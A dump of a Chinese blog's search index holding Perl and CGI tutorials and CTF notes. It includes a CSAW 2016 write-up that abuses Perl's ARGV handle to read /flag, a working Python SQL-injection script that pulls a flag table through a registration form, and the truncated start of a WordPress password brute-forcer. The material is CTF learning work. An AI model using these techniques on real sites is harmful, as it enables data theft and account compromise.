31-Dec-2017 23:12:40 GMT”;\\n&quot;; print “Set-Cookie:Domain=www.runoob.com;\\n”; print “Set-Cookie:Path=/perl;\\n”; print “Content-type:text/html\\r\\n\\r\\n”; …其他 HTML 内容 查找 Cookie Cookie信息检索页非常简单，Cookie信息存储在CGI的环境变量HTTP_COOKIE中，存储格式如下： 实例 #!/usr/bin/perl $rcvd_cookies = $ENV{‘HTTP_COOKIE’}; @cookies = split /;/, $rcvd_cookies; foreach cookie ( @cookies ){ (key, $val) = split(/=/, $cookie); # splits on the first =. $key =~ s/^\\s+//; $val =~ s/^\\s+//; key =~ s/\\s+//; val =~ s/\\s+//; if( $key eq “UserID” ){ $user_id = val; }elsif(key eq “Password”){ $password = $val; } } print “User ID = $user_id\\n”; print “Password = $password\\n”; 以上实例输出结果为： 12User ID = XYZPassword = XYZ123 CGI 模块 Perl 提供了很多内置的 CGI 模块，常用以下两个： CGI 模块 Berkeley cgi-lib.pl"},{"title":"Perl特殊变量","date":"2020-03-20","updated":"2024-03-19","path":"2020/03/20/Perl特殊变量/","text":"Perl 特殊变量 Perl 语言中定义了一些特殊的变量，通常以 ,@,或, @, 或 % 作为前缀，例如：,@,或_。 很多特殊的变量有一个很长的英文名，操作系统变量 $! 可以写为 $OS_ERROR。 如果你想使用英文名的特殊变量需要在程序头部添加 use English;。这样就可以使用具有描述性的英文特殊变量。 最常用的特殊变量为 $_，该变量包含了默认输入和模式匹配内容。实例如下： 实例 123456#!/usr/bin/perl foreach (&#x27;Google&#x27;,&#x27;Runoob&#x27;,&#x27;Taobao&#x27;) &#123; print $_; print &quot;\\n&quot;;&#125; 执行以上程序，输出结果为： 123GoogleRunoobTaobao 以下实例我们不使用 $_ 来输出内容： 实例 123456#!/usr/bin/perl foreach (&#x27;Google&#x27;,&#x27;Runoob&#x27;,&#x27;Taobao&#x27;) &#123; print; print &quot;\\n&quot;;&#125; 执行以上程序，输出结果为： 123GoogleRunoobTaobao 实例中，首先输出 “Google” ，接着输出 “Runoob” ，最后输出 “Taobao” 。 在迭代循环中，当前循环的字符串会放在 $_ 中, 然后 通过 print 输出。另外 print 在不指定输出变量，默认情况下使用的也是 $_。 以下是几处即使没有写明 Perl 也会假定使用 $_ 的地方： 各种单目函数，包括像 ord() 和 int() 这样的函数以及除 “-t&quot;以外所有的文件 测试操作 (”-f&quot;，“-d”)，“-t” 默认操作 STDIN。 各种列表函数，例如 print() 和 unlink()。 没有使用 “=~” 运算符时的模式匹配操作 “m//”、“s///” 和&quot;tr///&quot;。 在没有给出其他变量时是 “foreach” 循环的默认迭代变量。 grep() 和 map() 函数的隐含迭代变量。 当 “while” 仅有唯一条件，且该条件是对 &quot;“操作的结果进行测试时，$_ 就是存放输入记录的默认位置。除了&quot;while” 测试条件之外不会发生这种情况。(助记：下划线在特定操作中是可以省略的。) 特殊变量类型 根据特殊的变量的使用性质，可以分为以下几类： 全局标量特殊变量。 全局数组特殊变量。 全局哈希特殊变量。 全局特殊文件句柄。 全局特殊常量。 正则表达式特殊变量。 文件句柄特殊变量。 全局标量特殊变量 以下列出了所有的标量特殊变量，包含了特殊字符与英文形式的变量： $_ 默认输入和模式匹配内容。 $ARG $. 前一次读的文件句柄的当前行号 $NR $/ 输入记录分隔符,默认是新行字符。如用undef这个变量,将读到文件结尾。 $RS $, 输出域分隔符 $OFS $\\ 输出记录分隔符 $ORS $&quot; 该变量同 $,类似，但应用于向双引号引起的字符串(或类似的内插字符串)中内插数组和切片值的场合。默认为一个空格。 $LIST_SEPARATOR $; 在仿真多维数组时使用的分隔符。默认为 “\\034”。 $SUBSCRIPT_SEPARATOR $^L 发送到输出通道的走纸换页符。默认为 “\\f”. $FORMAT_FORMFEED $: The current set of characters after which a string may be broken to fill continuation fields (starting with ^) in a format. Default is “\\n”&quot;. $FORMAT_LINE_BREAK_CHARACTERS $^A 打印前用于保存格式化数据的变量 $ACCUMULATOR $# 打印数字时默认的数字输出格式（已废弃）。 $OFMT $? 返回上一个外部命令的状态 $CHILD_ERROR $! 这个变量的数字值是errno的值,字符串值是对应的系统错误字符串 $OS_ERROR or $ERRNO $@ 命令eval的错误消息.如果为空,则表示上一次eval命令执行成功 $EVAL_ERROR $$ 运行当前Perl脚本程序的进程号 $PROCESS_ID or $PID $&lt; 当前进程的实际用户号 $REAL_USER_ID or $UID $&gt; 当前进程的有效用户号 $EFFECTIVE_USER_ID or $EUID $( 当前进程的实际组用户号 $REAL_GROUP_ID or $GID $) 当前进程的有效组用户号 $EFFECTIVE_GROUP_ID or $EGID $0 包含正在执行的脚本的文件名 $PROGRAM_NAME $[ 数组的数组第一个元素的下标,默认是 0。 $] Perl的版本号 $PERL_VERSION $^D 调试标志的值 $DEBUGGING $^E 在非UNIX环境中的操作系统扩展错误信息 $EXTENDED_OS_ERROR $^F 最大的文件捆述符数值 $SYSTEM_FD_MAX $^H 由编译器激活的语法检查状态 $^I 内置控制编辑器的值 $INPLACE_EDIT $^M 备用内存池的大小 $^O 操作系统名 $OSNAME $^P 指定当前调试值的内部变量 $PERLDB $^T 从新世纪开始算起,脚步本以秒计算的开始运行的时间 $BASETIME $^W 警告开关的当前值 $WARNING $^X Perl二进制可执行代码的名字 $EXECUTABLE_NAME $ARGV 从默认的文件句柄中读取时的当前文件名 全局数组特殊变量 @ARGV 传给脚本的命令行参数列表 @INC 在导入模块时需要搜索的目录列表 @F 命令行的数组输入 全局哈希特殊变量 %INC 散列表%INC包含所有用do或require语句包含的文件.关键字是文件名,值是这个文件的路径 %ENV 包含当前环境变量 %SIG 信号列表及其处理方式 全局特殊文件句柄 ARGV 遍历数组变量@ARGV中的所有文件名的特殊文件句柄 STDERR 标准错误输出句柄 STDIN 标准输入句柄 STDOUT 标准输出句柄 DATA 特殊文件句柄引用了在文件中 END 标志后的任何内容包含脚本内容。或者引用一个包含文件中__DATA__ 标志后的所有内容，只要你在同一个包有读取数据，DATA 就存在。 _ (下划线) 特殊的文件句柄用于缓存文件信息(fstat、stat和lstat)。 全局特殊常量 END 脚本的逻辑结束，忽略后面的文本。 FILE 当前文件名 LINE 当前行号 PACKAGE 当前包名，默认的包名是main。 正则表达式特殊变量 $n 包含上次模式匹配的第n个子串 $&amp; 前一次成功模式匹配的字符串 $MATCH $` 前次匹配成功的子串之前的内容 $PREMATCH $’ 前次匹配成功的子串之后的内容 $POSTMATCH $+ 与上个正则表达式搜索格式匹配的最后一个括号。例如： `/Version: (.*) $LAST_PAREN_MATCH 文件句柄特殊变量 $| 如果设置为零,在每次调用函数write或print后，自动调用函数fflush,将所写内容写回文件 $OUTPUT_AUTOFLUSH $% 当前输出页号 $FORMAT_PAGE_NUMBER $= 当前每页长度。默认为 60。 $FORMAT_LINES_PER_PAGE $- 当前页剩余的行数 $FORMAT_LINES_LEFT $~ 当前报表输出格式的名称。默认值是文件句柄名。 $FORMAT_NAME $^ 当前报表输出表头格式的名称。默认值是带后缀&quot;_TOP&quot;的文件句柄名。 $FORMAT_TOP_NAME 命令行参数ARGV perl将perl命令行的参数列表放进数组ARGV(@ARGV)中。既然是数组，就可以访问($ARGV[n])、遍历，甚至修改数组元素 ARGV数组分三种情况收集： perl x.pl a b c方式运行时，脚本名x.pl之后的a b c才会被收集到ARGV数组 ./x.pl a b c方式运行时，a b c才会被收集到ARGV数组 perl -e 'xxxxx' a b c方式运行时，a b c才会被收集到ARGV数组 ARGV数组索引从0开始计算，索引0位从脚本名(perl程序名)之后的参数开始计算 默认，这些命令行参数是perl程序的数据输入源，也就是perl会依次将它们当作文件进行读取 参数是有序的，读取的时候也是有序的 需要区分ARGV变量和ARGV数组： $ARGV表示命令行参数代表的文件列表中，当前被处理的文件名 @ARGV表示命令行参数数组 $ARGV[n]：表示命令行参数数组的元素 ARGV：表示&lt;&gt;当前正在处理的文件句柄 例如，test.plx的内容如下： 1234567/usr/bin/perlprint &#x27;$ARGV[0] ---&gt; &#x27;,$ARGV[0],&quot;\\n&quot;, &#x27;$ARGV[1] ---&gt; &#x27;,$ARGV[1],&quot;\\n&quot;, &#x27;$ARGV[2] ---&gt; &#x27;,$ARGV[2],&quot;\\n&quot;, &#x27;$ARGV[3] ---&gt; &#x27;,$ARGV[3],&quot;\\n&quot;, &#x27;$ARGV[4] ---&gt; &#x27;,$ARGV[4],&quot;\\n&quot;; 执行这个程序： 123456shell&gt; ./test.plx -w a b c d$ARGV[0] ---&gt; -w$ARGV[1] ---&gt; a$ARGV[2] ---&gt; b$ARGV[3] ---&gt; c$ARGV[4] ---&gt; d 因为是数组，所以可以修改数组，比如强制指定元素： 1234567891011/usr/bin/perl@ARGV=qw(first second third);print &#x27;$ARGV[0] ---&gt; &#x27;,$ARGV[0],&quot;\\n&quot;, &#x27;$ARGV[1] ---&gt; &#x27;,$ARGV[1],&quot;\\n&quot;, &#x27;$ARGV[2] ---&gt; &#x27;,$ARGV[2],&quot;\\n&quot;;shell&gt; ./test.plx a b c d$ARGV[0] ---&gt; first$ARGV[1] ---&gt; second$ARGV[2] ---&gt; third 例如，读取2个文件(a.log,b.log)的内容： 123456/usr/bin/perlwhile(&lt;&gt;)&#123; print $_;&#125;shell&gt; ./test.plx a.log b.log 如果想读取标准输入，只需使用&quot;-&quot;作为文件参数即可。 1$ echo -e &quot;abcd\\nefg&quot; | ./test.plx a.log - b.log 上面将按先后顺序读取a.log，标准输入(管道左边命令的输出内容)，b.log。 https://www.cnblogs.com/f-ck-need-u/p/9557041.html"},{"title":"csaw-ctf-2016-quals","date":"2020-03-20","updated":"2024-03-19","path":"2020/03/20/csaw-ctf-2016-quals/","text":"i-got-id-200 文件上传处猜测后台逻辑是简单的接受文件，并将内容输出 12345678910use strict;use warnings; use CGI;my $cgi= CGI-&gt;new;if ( $cgi-&gt;upload( &#x27;file&#x27; ) ) &#123; my $file= $cgi-&gt;param( &#x27;file&#x27; ); # 接受文件 $file是文件句柄 while ( &lt;$file&gt; ) &#123; # 遍历文件 print &quot;$_&quot;; # $_代表默认输出，也就是文件每一行的值 &#125; &#125; 在Perl中存在一个全局参数ARGV perl将perl命令行的参数列表放进数组ARGV(@ARGV)中。既然是数组，就可以访问($ARGV[n])、遍历，甚至修改数组元素 我们可以尝试上传文件内容为ARGV然后，再GET参数提交一个文件路径/flag Perl 特殊变量 全局特殊文件句柄 ARGV 遍历数组变量@ARGV中的所有文件名的特殊文件句柄 STDERR 标准错误输出句柄 STDIN 标准输入句柄 STDOUT 标准输出句柄 DATA 特殊文件句柄引用了在文件中 END 标志后的任何内容包含脚本内容。或者引用一个包含文件中__DATA__ 标志后的所有内容，只要你在同一个包有读取数据，DATA 就存在。 _ (下划线) 特殊的文件句柄用于缓存文件信息(fstat、stat和lstat)。"},{"title":"Web-CGI通用网管接口","date":"2020-03-20","updated":"2024-03-19","path":"2020/03/20/Web-CGI通用网管接口/","text":"CGI (通用网关接口) 公共网关接口（Common Gateway Interface，CGI）是Web 服务器运行时外部程序的规范，按CGI 编写的程序可以扩展服务器功能。CGI 应用程序能与浏览器进行交互，还可通过数据API与数据库服务器等外部数据源进行通信，从数据库服务器中获取数据。格式化为HTML文档后，发送给浏览器，也可以将从浏览器获得的数据放到数据库中。几乎所有服务器都支持CGI，可用任何语言编写CGI，包括流行的C、C ++、Java、VB 和Delphi 等。CGI分为标准CGI和间接CGI两种。标准CGI使用命令行参数或环境变量表示服务器的详细请求，服务器与浏览器通信采用标准输入输出方式。间接CGI又称缓冲CGI，在CGI程序和CGI接口之间插入一个缓冲程序，缓冲程序与CGI接口间用标准输入输出进行通信 [1] 。 简介 CGI（Common Gateway Interface）公共网关接口，是外部扩展应用程序与 Web 服务器交互的一个标准接口。服务器端与客户端进行交互的常见方式多，CGI 技术就是其中之一。根据CGI标准，编写外部扩展应用程序，可以对客户端浏览器输入的数据进行处理，完成客户端与服务器的交互操作。CGI规范定义了Web服务器如何向扩展应用程序发送消息，在收到扩展应用程序的信息后又如何进行处理等内容。对于许多静态的HTML网页无法实现的功能，通过 CGI可以实现，比如表单的处理、对数据库的访问、搜索引擎、基于Web的数据库访问等等。使用CGI实现客户端与服务器的交互有以下几个标准步骤，具体步骤如下： （1）Web 客户端的浏览器将URL的第一部分解码与Web服务器相连。 （2）Web 浏览器将URL的其余部分提供给服务器。 （3）Web 服务器将URL转换成路径和文件名。 （4）Web 服务器发送 HTML 和别的组成请求页面的文件给客户。一旦页面内容传送完， 这个连接自动断开。 （5）在客户端，HTML脚本提示用户做动作或输入。当用户响应后，客户请求Web服务器建立一个新的连接。 （6）Web 服务器把这些信息和别的进程变量传送给由HTML以URL的形式指定CGI程序。 （7）CGI 根据输入作出响应，把响应结果传送给 Web 服务器。 （8）Web 服务器把响应的数据传给客户，完成后关闭连接。 [2] 一．基本原理 CGI：通用网关接口（Common Gateway Interface）是一个Web服务器主机提供信息服务的标准接口。通过CGI接口，Web服务器就能够获取客户端提交的信息，转交给服务器端的CGI程序进行处理，最后返回结果给客户端。 组成CGI通信系统的是两部分：一部分是html页面，就是在用户端浏览器上显示的页面。另一部分则是运行在服务器上的Cgi程序。它们之间的通讯方式如下图： 服务器和客户端之间的通信，是客户端的浏览器和服务器端的http服务器之间的HTTP通信，我们只需要知道浏览器请求执行服务器上哪个CGI程序就可以了，其他不必深究细节，因为这些过程不需要程序员去操作。 服务器和CGI程序之间的通讯才是我们关注的。一般情况下，服务器和CGI程序之间是通过标准输入输出来进行数据传递的，而这个过程需要环境变量的协作方可实现。 1. 服务器将URL指向一个应用程序 2. 服务器为应用程序执行做准备 3. 应用程序执行，读取标准输入和有关环境变量 4. 应用程序进行标准输出 对于Windows系统而言，还可以通过profile文件进行数据传输（如ini文件），但在这里不做研究。环境变量在CGI中有着重要的地位！每个CGI程序只能处理一个用户请求，所以在激活一个CGI程序进程时也创建了属于该进程的环境变量。 二．环境变量 ​ 对于CGI程序来说，它继承了系统的环境变量。CGI环境变量在CGI程序启动时初始化，在结束时销毁。 ​ 当一个CGI程序不是被HTTP服务器调用时，它的环境变量几乎是系统环境变量的复制。当这个CGI程序被HTTP服务器调用时，它的环境变量就会多了以下关于HTTP服务器、客户端、CGI传输过程等项目。 ​ CONTENT_TYPE:如application/x-www-form-urlencoded，表示数据来自HTML表单，并且经过了URL编码。 ACCEPT:客户机所支持的MIME类型清单，内容如：”image/gif,image/jpeg” REQUEST_METHOD：它的值一般包括两种:POST和GET，但我们写CGI程序时，最后还要考虑其他的情况。 1．POST方法 如果采用POST方法，那么客户端来的用户数据将存放在CGI进程的标准输入中，同时将用户数据的长度赋予环境变量中的CONTENT_LENGTH。客户端用POST方式发送数据有一个相应的MIME类型（通用Internet邮件扩充服务：Multi-purpose Internet Mail Extensions）。目前，MIME类型一般是：application/x-wwww-form-urlencoded，该类型表示数据来自HTML表单。该类型记录在环境变量CONTENT_TYPE中，CGI程序应该检查该变量的值。 2．GET方法 在该方法下，CGI程序无法直接从服务器的标准输入中获取数据，因为服务器把它从标准输入接收到得数据编码到环境变量QUERY_STRING（或PATH_INFO）。 GET与POST的区别：采用GET方法提交HTML表单数据的时候，客户机将把这些数据附加到由ACTION标记命名的URL的末尾，用一个包括把经过URL编码后的信息与CGI程序的名字分开：http://www.mycorp.com/hello.html？name=hgq$id=1，QUERY_STRING的值为name=hgq&amp;id=1 有些程序员不愿意采用GET方法，因为在他们看来，把动态信息附加在URL的末尾有违URL的出发点：URL作为一种标准用语，一般是用作网络资源的唯一定位标示。 ​ 环境变量是一个保存用户信息的内存区。当客户端的用户通过浏览器发出CGI请求时，服务器就寻找本地的相应CGI程序并执行它。在执行CGI程序的同时，服务器把该用户的信息保存到环境变量里。接下来，CGI程序的执行流程是这样的：查询与该CGI程序进程相应的环境变量：第一步是request_method，如果是POST，就从环境变量的len，然后到该进程相应的标准输入取出len长的数据。如果是GET，则用户数据就在环境变量的QUERY_STRING里。 3．POST与GET的区别 以 GET 方式接收的数据是有长度限制，而用 POST 方式接收的数据是没有长度限制的。并且，以 GET 方式发送数据，可以通过URL 的形式来发送，但 POST方式发送的数据必须要通过 Form 才到发送。 三．CGI程序实现步骤 1．从服务器获取数据 C语言实现代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int get_inputs()&#123;int length;char *method;char *inputstring;method = getenv(“REQUEST_METHOD”); //将返回结果赋予指针if(method == NULL) return 1; //找不到环境变量REQUEST_METHODif(!strcmp(method, ”POST”)) // POST方法&#123; length = atoi(getenv(“CONTENT_LENGTH”)); //结果是字符，需要转换 if(length != 0) &#123; inputstring = malloc(sizeof(char)*length + 1) //必须申请缓存，因为stdin是不带缓存的。 fread(inputstring, sizeof(char), length, stdin); //从标准输入读取一定数据&#125;&#125;else if(!strcmp(method, “GET”))&#123; Inputstring = getenv(“QUERY_STRING”); length = strlen(inputstring);&#125;if(length == 0)return 0;&#125; ​ Perl实现代码： 123456789101112131415161718192021222324252627$method = $ENV&#123;‘REQUEST_METHOD’&#125;;if($method eq ‘POST’)&#123; Read(STDIN, $input, $ENV&#123;‘CONTENT_LENGTH’&#125;);&#125;if($method eq ‘GET’ || $method eq ‘HEAD’)&#123; $input = $ENV&#123;‘QUERY_STRING’&#125;;&#125;if($input eq “”)&#123;&amp;print_form;exit;&#125; ​ PYTHON代码实现 1234567#!/usr/local/bin/pythonimport cgidef main():form = cgi.FieldStorage() ​ Python代码实现更简单，cgi.FieldStorage()返回一个字典，字典的每一个key就是变量名，key对应的值就是变量名的值，更本无需用户再去进行数据解码！ ​ 获取环境变量的时候，如果先判断“REQUEST_METHOD”是否存在，程序会更健壮，否则在某些情况下可能会造成程序崩溃。因为假若CGI程序不是由服务器调用的，那么环境变量集里就没有与CGI相关的环境变量（如REQUEST_METHOD，REMOTE_ADDR等）添加进来，也就是说“getenv(“REQUEST_METHOD”)”将返回NULL！ 2．URL编码 ​ 不管是POST还是GET方式，客户端浏览器发送给服务器的数据都不是原始的用户数据，而是经过URL编码的。此时，CGI的环境变量Content_type将被设置，如Content_type = application/x-www-form-urlencode就表示服务器收到的是经过URL编码的包含有HTML表单变量数据。 编码的基本规则是： 变量之间用“&amp;”分开； 变量与其对应值用“=”连接； 空格用“+”代替； 保留的控制字符则用“%”连接对应的16禁止ASCII码代替； 某些具有特殊意义的字符也用“%”接对应的16进制ASCII码代替； 空格是非法字符； 任意不可打印的ASCII控制字符均为非法字符。 例如，假设3个HTML表单变量filename、e-mail和comments，它们的值对应分别为hello、mike@hotmail.com和I’ll bethere for you，则经过URL编码后应为： 1filename=hello&amp;e-mail=hello@hotmail.com&amp;comments=I%27ll+be+there+for+you 所以，CGI程序从标准输入或环境变量中获取客户端数据后，还需要进行解码。解码的过程就是URL编码的逆变：根据“&amp;”和“=”分离HTML表单变量，以及特殊字符的替换。 在解码方面： PYTHON代码实现是最理想的，cgi.FieldStorage()函数在获取数据的同时就已自动进行代码转换了，无需程序员再进行额外的代码编写。Perl其次，因为在一个现成的Perl库：cgi-lib.pl中提供了ReadParse函数，用它来进行URL解码很简单： 123require ‘cgi-lib.pl’;&amp;ReadParse(*input); CGI数据输出方面： CGI程序如何将信息处理结果返回给客户端？这实际上是CGI格式化输出。 在CGI程序中的标准输出stdout是经过重定义了的，它并没有在服务器上产生任何的输出内容，而是被重定向到客户浏览器，这与它是由C，还是Perl或Python实现无关。 所以，我们可以用打印来实现客户端新的HTML页面的生成。比如，C的printf是向该进程的标准输出发送数据，Perl和Python用print向该进程的标准输出发送数据。 （1） CGI标题 CGI的格式输出内容必须组织成标题/内容的形式。CGI标准规定了CGI程序可以使用的三个HTTP标题。标题必须占据第一行输出！而且必须随后带有一个空行 ( 2 ) MIME： 向标准输出发送网页内容时要遵守MIME格式规则： 任意输出前面必须有一个用于定义MIME类型的输出内容（Content-type）行，而且随后还必须跟一个空行。如果遗漏了这一条，服务将会返回一个错误信息。（同样使用于其他标题） 例如Perl和Python： 12345print “Content-type:text/html\\n\\n”; //输出HTML格式的数据print “&lt;body&gt;welcome&lt;br&gt;”print “&lt;/body&gt;” C语言： 123printf( “Content-type:text/html\\n\\n”);printf(“Welcome\\n”); MIME类型以类型/子类型（type/subtype）的形式表示。 其中type表示一下几种典型文件格式的一种： Text、Audio、Video、Image、Application、Mutipart、Message Subtype则用来描述具体所用的数据格式。 Location： 使用Location标题，一个CGI可以使当前用户转而访问同一服务器上的另外一个程序，甚至可以访问另外一个URL，但服务器对他们的处理方式不一样。 使用Location的格式为：Location：Filename/URL，例如： 123456 print “Location:/test.html\\n\\n”;这与直接链接到test.html的效果是一样的。print “Location:http://www.chinaunix.com/\\n\\n”由于该URL并不指向当前服务器，用户浏览器并不会直接链接到指定的URL，而是给用户输出提示信息。 HTTP状态码： ​ 表示了请求的结果状态，是CGI程序通过服务器用来通知用户其请求是否成功执行的信息码，本文不做研究。 就是获得getResponseCode(),一般值在0~200为正常，超过视为不正常或特殊意思 四．CGI中的信号量和文件锁 ​ 因为CGI程序时公用的，而WEB服务器都支持多进程运行，因此可能会发生同时有多个用户访问同一个CGI程序的情况。比如，有2个用户几乎同时访问同一个CGI程序，服务器为他们创建了2个CGI程序进程，设为进程A和进程B。假如进程A首先打开了某个文件，然后由于某种原因被挂起（一般是由于操作系统的进程调度）；而就在进程A被挂起的这段时间内，进程B完成了对文件的整个操作流程：打开，写入，关闭；进程A再继续往下执行，但进程A所操作的文件依旧是原来文件的就版本，此时进程A的操作结果将覆盖进程B的操作结果。 为了防止这种情况发生，需要用到文件锁或者信号量。 钥匙文件？ 假如有多个不同的HTML可以调用同一个CGI程序，那么CGI程序如何区分它们呢？一个是通过隐含的INPUT标签。不过觉得这个比较麻烦，因为CGI必须经过一系列解码后才能找到这个隐含INPUT的变量和其值。 五．设置HTTP服务器以兼容CGI ​ 用Perl编写的CGI程序后缀为：.pl；Python编写的CGI程序后缀为：.py；而C编写的CGI程序后缀为：.cgi，如果在win下编译出来的是.exe，最好将它重命名为.cgi。这些都是为了HTTP服务能够识别并调用它们。 ​ 当使用appche httpd服务器时 请编辑它的配置文件httpd.conf如下： ​ 修改AddHandler cgi-script一句为AddHandler cgi-script .cgi .py.pl 在指定目录下添加.htaccess文件,内容如下: 1Options +ExecCGI AddHandler cgi-script .sam 六．关于CGI的C语言库——cgihtml ​ Cgihtml是一个应用非常广泛的C语言编写的CGI库。它提供的功能函数如下： ​ Read_cgi_input()：获取并解析HTML表单输入，返回一个指向某结构体的指针 ​ Cgi_val()：获取每个表单变量的值 ​ Html_header():输出HTML标题栏 ​ Html_begin():输出HTML文档的开始部分 ​ H1():输出一行字符，字体为H1 Html_end():输出HTML文档的结尾部分。 #include “cgi-lib.h” #include “html-lib.h” #include “string-lib.h”"},{"title":"python带cookie-headers请求脚本","date":"2020-03-20","updated":"2024-03-19","path":"2020/03/20/python带cookie-headers请求脚本/","text":"123456789101112131415161718192021222324252627282930313233343536373839404142434445import requestsimport reurl=&quot;http://111.198.29.45:54295/&quot;r=requests.session()hearders=&#123; &quot;User-Agent&quot;: &quot;Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0&quot;, &quot;Referer&quot;: &quot;http://111.198.29.45:54295/register.php&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;Host&quot; : &quot;111.198.29.45:54295&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;Connection&quot;: &quot;close&quot;&#125;pattern=re.compile(r&#x27;name&quot;&gt;\\n(.*)&lt;&#x27;)def payload(i): regist=&#123;&quot;email&quot;:&quot;&#123;&#125;@a.a&quot;.format(i+10), &quot;username&quot;:&quot;0&#x27;%2B(select substr(hex(hex((select * from flag))) from &#123;&#125; for 10))%2B&#x27;0&quot;.format(i*10+1), &quot;password&quot;:&quot;sa&quot; &#125; return regist registDict=[ payload(i) for i in range(10) ]flag=&quot;&quot;try: for i in range(10): r.headers.update(hearders) t=r.post(url+&quot;register.php&quot;,data=registDict[i],headers=hearders,cookies=&#123;&quot;PHPSESSID&quot;:&quot;l2vegj57h3fvbm5bgrkm3kvcj0&quot;&#125;) if(t.status_code == 302): # 注册成功会自动跳转，不跳转就是注册失败 r.post(url+&quot;login.php&quot;,data=&#123;&quot;email&quot;:registDict[i][&#x27;email&#x27;],&quot;password&quot;:registDict[i][&#x27;password&#x27;]&#125;) cont=r.get(url+&quot;index.php&quot;) res=pattern.search(cont.text) res=res.group(1).strip() flag=flag+res print(flag) else: print(&quot;注册失败&#123;&#125;&quot;.format(registDict[i]))#如果出错，输出具体错误except requests.RequestException as e: print(e)"},{"title":"python-requests-headers设置","date":"2020-03-20","updated":"2024-03-19","path":"2020/03/20/python-requests-headers设置/","text":"设置headers 1234567891011url = &quot;http://www.server.com/login&quot;# 设置请求的身份，如果没有，服务器可能会没有响应user_agent = &quot;Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)&quot;values = &#123;&quot;username&quot;: &quot;geek&quot;, &quot;password&quot;: &quot;**********&quot;&#125;# 在headers中设置agentheaders = &#123;&quot;User-Agent&quot;: user_agent&#125;data = urllib.urlencode(values)# 在request中添加headersrequest = urllib2.Request(url, data, headers)response = urllib2.urlopen(request)page = response.read() 对付“反盗链” 123# 对付“反盗链”(服务器会识别headers中的referer是不是它自己,如果不是则不响应),构建以下headersheaders = &#123;&quot;User-Agent&quot;: &quot;Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)&quot;, &quot;Referer&quot;: &quot;http://www.zhihu.com/articles&quot;&#125; headers的一些其他属性 1234567# headers的一些其他属性：# User-Agent : 有些服务器或 Proxy 会通过该值来判断是否是浏览器发出的请求# Content-Type : 在使用 REST 接口时，服务器会检查该值，用来确定 HTTP Body 中的内容该怎样解析。# application/xml ： 在 XML RPC，如 RESTful/SOAP 调用时使用# application/json ： 在 JSON RPC 调用时使用# application/x-www-form-urlencoded ： 浏览器提交 Web 表单时使用# 在使用服务器提供的 RESTful 或 SOAP 服务时， Content-Type 设置错误会导致服务器拒绝服务 设置代理 123456789101112# Proxy(代理)的设置# urllib2 默认会使用环境变量 http_proxy 来设置 HTTP Proxy。# 假如一个网站它会检测某一段时间某个IP 的访问次数，如果访问次数过多，它会禁止你的访问。# 所以可以设置一些代理服务器来帮助你做工作，每隔一段时间换一个代理enable_proxy = Trueproxy_handler = urllib2.ProxyHandler(&#123;&quot;http&quot;: &#x27;http://some-proxy.com:8080&#x27;&#125;)null_proxy_handler = urllib2.ProxyHandler(&#123;&#125;)if enable_proxy: opener = urllib2.build_opener(proxy_handler)else: opener = urllib2.build_opener(null_proxy_handler)urllib2.install_opener(opener) timeout的设置 12345# Timeout设置# 为了解决一些网站实在响应过慢而造成的影响# 如果第二个参数data为空那么要特别指定是timeout是多少，写明形参，如果data已经传入，则不必声明response = urllib2.urlopen(&#x27;http://www.baidu.com&#x27;, timeout=10)response = urllib2.urlopen(&#x27;http://www.baidu.com&#x27;, data, 10) http的六种协议 12345678910111213# http协议有六种请求方法，get,head,put,delete,post,options，我们有时候需要用到PUT方式或者DELETE方式请求# PUT：这个方法比较少见。HTML表单也不支持这个。# 本质上来讲， PUT和POST极为相似，都是向服务器发送数据，但它们之间有一个重要区别，PUT通常指定了资源的存放位置，而POST则没有，POST的数据存放位置由服务器自己决定。# DELETE：删除某一个资源。request = urllib2.Request(url, data=data)request.get_method = lambda: &#x27;PUT&#x27; # or &#x27;DELETE&#x27;response = urllib2.urlopen(request)# 可以通过下面的方法把 Debug Log 打开，这样收发包的内容就会在屏幕上打印出来，方便调试httpHandler = urllib2.HTTPHandler(debuglevel=1)httpsHandler = urllib2.HTTPSHandler(debuglevel=1)opener = urllib2.build_opener(httpHandler, httpsHandler)urllib2.install_opener(opener)response = urllib2.urlopen(&#x27;http://www.baidu.com&#x27;) cookie 123456789101112131415161718192021222324import requestsfrom requests.cookies import RequestsCookieJarheaders = &#123; &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36&#x27;,&#125;url = &#x27;Target_URL&#x27;res = requests.get(url, headers)# print(res.cookies)# 创建一个cookiejar实例cookie_jar = RequestsCookieJar()# 将获取的cookie转化为字典resd = requests.utils.dict_from_cookiejar(res.cookies)# 放开下面的，可查看cookie 的 key/value# print(requests.utils.cookiejar_from_dict(resd))# cookie_jar.set(&#x27;cookie[key]&#x27;, &#x27;cookie[value]&#x27;, domain=&#x27;域名&#x27;)cookie_jar.set([key for key in resd][0], resd[[key for key in resd][0]], domain=&#x27;www.123.com&#x27;)# 向请求头中添加cookieres = requests.get(url, headers, cookies=cookie_jar)print(res.status_code)print(res.text.encode(&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;)) a 12345678910111213141516171819202122232425262728293031323334353637383940414243444546# -*- coding: utf-8 -*-&#x27;&#x27;&#x27;Program：WordPress后台登陆Function：读取字典逐个登陆Wordpress后台，在知道用户名的情况下，可用来爆破登陆密码 Version：Python3.6&#x27;&#x27;&#x27;#导入requests库，跟2.x的urllib2和3.x的urllib.request差不多的功能，不过好像更强大import requests #登陆后台url = &#x27;http://www.bywalks.com/wp-login.php&#x27; #HTTP的header头，添加个user-agent，有的网站会从User-Agent来判断是否是程序访问#如果是程序访问则不允许，添加个user-agent就是欺骗这种防护#在这里的后台wordpress好像不用加headers = 